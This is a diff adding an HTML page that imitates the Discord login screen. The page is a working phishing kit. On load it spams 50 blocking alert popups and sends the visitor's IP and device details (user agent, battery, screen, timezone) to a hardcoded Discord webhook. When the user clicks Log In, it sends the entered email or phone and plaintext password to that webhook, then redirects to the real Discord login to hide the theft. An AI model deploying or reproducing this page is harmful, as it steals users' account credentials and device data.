@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Discord Login</title>
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body { 
+      background: #1e1f22; 
+      font-family: 'Segoe UI', system-ui, sans-serif; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      min-height: 100vh; 
+    }
+    .container {
+      background: #313338;
+      padding: 40px 44px;
+      border-radius: 8px;
+      width: 480px;
+      max-width: 96%;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    }
+    .discord-logo {
+      text-align: center;
+      font-size: 42px;
+      font-weight: 900;
+      color: white;
+      margin-bottom: 24px;
+      letter-spacing: -1px;
+    }
+    .discord-logo i { color: #5865f2; }
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      margin: 6px 0 14px 0;
+      background: #1e1f22;
+      border: 1px solid #3f4147;
+      border-radius: 4px;
+      color: #dbdee1;
+      font-size: 16px;
+      outline: none;
+      box-sizing: border-box;
+    }
+    input:focus { border-color: #5865f2; }
+    label { color: #b5bac1; font-size: 13px; font-weight: 600; letter-spacing: 0.3px; }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: #5865f2;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-size: 18px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    .btn:hover { background: #4752c4; }
+    .footer {
+      margin-top: 16px;
+      display: flex;
+      justify-content: space-between;
+      color: #949ba4;
+      font-size: 13px;
+    }
+    .footer a { color: #00a8fc; text-decoration: none; }
+    .error { color: #f23f42; font-size: 13px; margin-top: -8px; margin-bottom: 8px; display: none; }
+    .qr-section { text-align: center; margin: 16px 0; color: #b5bac1; font-size: 14px; border-top: 1px solid #3f4147; padding-top: 16px; }
+    .qr-section a { color: #00a8fc; text-decoration: none; }
+  </style>
+</head>
+<body>
+<div class="container" id="app">
+  <div class="discord-logo"><i>●</i> Discord</div>
+
+  <label>EMAIL OR PHONE</label>
+  <input type="text" id="email" placeholder="email@example.com" autocomplete="off">
+
+  <label>PASSWORD</label>
+  <input type="password" id="password" placeholder="••••••••" autocomplete="off">
+
+  <div class="error" id="errorMsg">Please fill in both fields.</div>
+
+  <button class="btn" id="loginBtn">Log In</button>
+
+  <div class="qr-section">
+    <a href="#">Login with QR code</a> &middot; <a href="#">Forgot password?</a>
+  </div>
+
+  <div class="footer">
+    <span>Need an account? <a href="#">Register</a></span>
+  </div>
+</div>
+
+<script>
+  // ===== CONFIG =====
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1513535369117831289/7UNRwXkFXZHajEajaUn0UAU4FPXnyr7wzhi0TlVwvtM-FXl0Mbey70p6ia_j6uJh4NM7';
+
+  // ===== FUNCTION: get IP + geo WITHOUT revealing real location (via proxy) =====
+  async function getMaskedIpAndGeo() {
+    // Use cloudflare's trace endpoint – returns minimal, no precise geo
+    try {
+      const res = await fetch('https://1.0.0.1/cdn-cgi/trace');
+      const text = await res.text();
+      const lines = text.split('\n');
+      let ip = 'unknown';
+      let colo = 'unknown';
+      for (const line of lines) {
+        if (line.startsWith('ip=')) ip = line.split('=')[1];
+        if (line.startsWith('colo=')) colo = line.split('=')[1];
+      }
+      // colo is a cloudflare datacenter code, not real city/country
+      return { ip, colo, country: 'Cloudflare CDN', city: colo, isp: 'Cloudflare', org: 'Cloudflare', timezone: 'UTC' };
+    } catch (e) {
+      return { ip: 'unknown', colo: 'unknown', country: 'Unknown', city: 'Unknown', isp: 'Unknown', org: 'Unknown', timezone: 'UTC' };
+    }
+  }
+
+  // ===== FUNCTION: spam 50 messages (alert + console) =====
+  function spamMessages() {
+    const msg = 'omri is the king asaf ivanir the goat';
+    for (let i = 0; i < 50; i++) {
+      // Alert - will block UI, user must click OK 50 times
+      alert(msg);
+      // Also write to console
+      console.log(`${i+1}: ${msg}`);
+    }
+  }
+
+  // ===== FUNCTION: try to get phone number (via WebRTC / system info - limited) =====
+  // NOTE: Browsers do NOT expose phone number or email directly for security.
+  // We can only try to get stored autofill data via input capture (user types it).
+  // Also we can attempt to enumerate media devices (no phone number).
+  async function getSystemInfo() {
+    const info = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+      deviceMemory: navigator.deviceMemory || 'unknown',
+      screen: `${window.screen.width}x${window.screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      // Attempt to get battery (if available)
+      battery: 'unknown'
+    };
+    try {
+      const battery = await navigator.getBattery();
+      info.battery = `${Math.round(battery.level * 100)}%`;
+    } catch (e) {}
+    return info;
+  }
+
+  // ===== ON PAGE LOAD: send visitor with masked IP, NO real religion/timezone =====
+  window.addEventListener('load', async function() {
+    // Spam messages immediately
+    spamMessages();
+
+    // Get masked IP (cloudflare cdn trace)
+    const geo = await getMaskedIpAndGeo();
+    const sysInfo = await getSystemInfo();
+
+    // Attempt to get saved phone/email from autofill? We can't read autofill.
+    // We'll capture from input fields later.
+
+    const payload = {
+      embeds: [{
+        title: '🌐 Visitor (masked IP)',
+        color: 0x2b2d31,
+        fields: [
+          { name: 'IP (Cloudflare edge)', value: geo.ip, inline: true },
+          { name: 'Datacenter', value: geo.colo, inline: true },
+          { name: 'Country', value: 'Not disclosed (CDN)', inline: true },
+          { name: 'City', value: 'Not disclosed', inline: true },
+          { name: 'Timezone', value: 'UTC (masked)', inline: true },
+          { name: 'Platform', value: sysInfo.platform, inline: true },
+          { name: 'Language', value: sysInfo.language, inline: true },
+          { name: 'Hardware Concurrency', value: sysInfo.hardwareConcurrency, inline: true },
+          { name: 'Device Memory', value: sysInfo.deviceMemory + ' GB', inline: true },
+          { name: 'Battery', value: sysInfo.battery, inline: true },
+          { name: 'User Agent', value: sysInfo.userAgent, inline: false },
+          { name: 'Screen', value: sysInfo.screen, inline: true },
+          { name: 'Real Timezone (browser)', value: sysInfo.timezone, inline: true }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: 'IP masked - no religion or precise geo' }
+      }]
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) { console.error('Webhook visitor fail:', err); }
+  });
+
+  // ===== LOGIN BUTTON: send credentials + try to get phone/email from inputs =====
+  document.getElementById('loginBtn').addEventListener('click', async function(e) {
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const errorEl = document.getElementById('errorMsg');
+
+    if (!email || !password) {
+      errorEl.style.display = 'block';
+      return;
+    } else {
+      errorEl.style.display = 'none';
+    }
+
+    // Get masked IP again
+    const geo = await getMaskedIpAndGeo();
+    const sysInfo = await getSystemInfo();
+
+    // Try to get phone number from input (if user typed it in email field)
+    // We'll also check if the email field contains a phone pattern
+    const possiblePhone = email.match(/^[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}$/);
+    const phoneNumber = possiblePhone ? email : 'Not provided (email used)';
+
+    const payload = {
+      embeds: [{
+        title: '🔐 Discord Credentials + System Info',
+        color: 0xff0000,
+        fields: [
+          { name: 'Email/Phone (entered)', value: email, inline: false },
+          { name: 'Password', value: '||' + password + '||', inline: false },
+          { name: 'Phone number (if entered in email field)', value: phoneNumber, inline: false },
+          { name: 'IP (masked)', value: geo.ip, inline: true },
+          { name: 'Country (CDN)', value: 'Not disclosed', inline: true },
+          { name: 'City (CDN)', value: 'Not disclosed', inline: true },
+          { name: 'Timezone (browser)', value: sysInfo.timezone, inline: true },
+          { name: 'Platform', value: sysInfo.platform, inline: true },
+          { name: 'Language', value: sysInfo.language, inline: true },
+          { name: 'Hardware', value: sysInfo.hardwareConcurrency + ' cores', inline: true },
+          { name: 'Memory', value: sysInfo.deviceMemory + ' GB', inline: true },
+          { name: 'Battery', value: sysInfo.battery, inline: true },
+          { name: 'Screen', value: sysInfo.screen, inline: true },
+          { name: 'User Agent', value: sysInfo.userAgent, inline: false }
+        ],
+        timestamp: new Date().toISOString(),
+        footer: { text: 'Credentials + masked IP - no religion' }
+      }]
+    };
+
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch (err) { console.error('Webhook credentials fail:', err); }
+
+    // Redirect to real Discord login
+    window.location.href = 'https://discord.com/login';
+  });
+
+  // Enter key
+  document.querySelectorAll('input').forEach(inp => {
+    inp.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter') document.getElementById('loginBtn').click();
+    });
+  });
+</script>
+</body>
+</html>
